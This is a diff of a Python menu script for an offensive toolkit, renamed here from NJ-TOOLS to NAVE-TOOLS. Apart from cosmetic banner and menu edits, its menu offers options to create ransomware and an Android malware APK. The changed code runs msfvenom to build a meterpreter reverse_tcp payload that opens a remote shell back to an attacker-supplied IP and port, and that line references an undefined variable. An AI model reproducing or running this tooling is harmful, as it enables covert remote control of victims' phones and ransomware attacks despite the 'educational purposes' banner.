@@ -8,19 +8,19 @@ y = "\033[93m"
 v = "\033[94m"
 g = "\033[92m"
 
-# Create a banner NAVEJAS
+# Create a banner NAVE
 print ("\033[92m")
 def banner():
     os.system("clear ")
     print("""
-████          ██     ██      ██        ██   ██████  ██████████      ██       ████████
-████         ██     ██ ██     ██      ██    ██           ██        ██ ██     ██
-██ ██       ██      ██  ██    ██      ██    ██           ██        ██  ██    ██
-██  ██     ██      ██   ██     ██    ██     ████         ██       ██   ██    ███
-██   ██    ██      ████████    ██    ██     ██           ██       ████████      ████
-██    ██  ██      ██     ██     ██  ██      ██           ██      ██     ██         ██
-██     ████       ██      ██    ██  ██      ██       █   ██      ██      ██        ██
-██     ██        ██       ██      ██        ██████   ██████     ██       ██  ████████
+                 ████          ██     ██      ██        ██   ██████  
+                 ████         ██     ██ ██     ██      ██    ██           
+                 ██ ██       ██      ██  ██    ██      ██    ██          
+                 ██  ██     ██      ██   ██     ██    ██     ████        
+                 ██   ██    ██      ████████    ██    ██    ██
+                 ██    ██  ██      ██     ██     ██  ██      ██
+                 ██     ████       ██      ██    ██  ██      ██       
+                 ██     ██        ██       ██      ██        ██████   
 
 """)
 
@@ -31,12 +31,12 @@ name = input("What can i call you ? :")
 # Create a Description
 banner()
 print (" _________________________________________________________________________________")
-print ("|--------------------------- author :  NAVEJAS ----------------------------------| ")
-print ("|-------------------------- TOOL NAME : NJ-TOOLS --------------------------------| ")
-print ("|-------------------- THIS TOOL FOR ONLY EDUCATIONAL PURPOSES -------------------| ")
+print ("|--------------------------- author :  NAVE ---------------------------------------| ")
+print ("|-------------------------- TOOL NAME : NAVE-TOOLS --------------------------------| ")
+print ("|-------------------- THIS TOOL FOR ONLY EDUCATIONAL PURPOSES ---------------------| ")
 print ("—————————————————————————————————————————————————————————————————————————————————")
 print (" ")
-print("Welcome to NAVEJAS,",name)
+print("Welcome to NAVE,",name)
 
 def display_time():
         now = datetime.datetime.now()
@@ -70,7 +70,7 @@ def display_menu():
     print(g+"| 19.",y+" Create a ransomware",r+"            (SARA)               " ,g+ "|" )         
     print(g+"| 20.",y+" Create a malware (apk)",r+"         (METASPLOIT)         " ,g+ "|" )         
     print(g+"|  m.",y+" more tools                                           " ,g+ "|" )
-    print(g+"| ns.",y+" Exit                                                 " ,g+ "|" )
+    print(g+"| n.",y+" Exit                                                 " ,g+ "|" )
     print("—————————————————————————————————————————————————————————————|",g+"" )
 print("")
 print("")
@@ -250,17 +250,17 @@ def main():
      ip = input(y+"Enter your ip adreess to create a malware : ")
      lport = input(g+"Enter your port number 4 digit : ")
      print("Creating a malware please wait.........")
-     os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lpor} > test.apk" )
+     os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lpor} > test.apk" )
 
 # choice m more tools
     elif choice == 'm':
       banner()
       time.sleep(1)
       os.system("clear")
-      os.system("python3 nj-toolsv2.py")
+      os.system("python3 nave-toolsv2.py")
 
 # choice ns to exit
-    elif choice == 'ns':
+    elif choice == 'n':
       banner()
       time.sleep(1)
       os.system("clear ")
@@ -271,7 +271,7 @@ def main():
       banner()
       time.sleep(1)
       os.system("clear ")
-      os.system("python3 nj-tools.py ")
+      os.system("python3 nave-tools.py ")
 
 
 # press other wrong key return this tools
@@ -279,7 +279,7 @@ def main():
       banner()
       time.sleep(1)
       os.system("clear ")
-      os.system("python3 nj-tools.py ")
+      os.system("python3 nave-tools.py ")
 
 
 
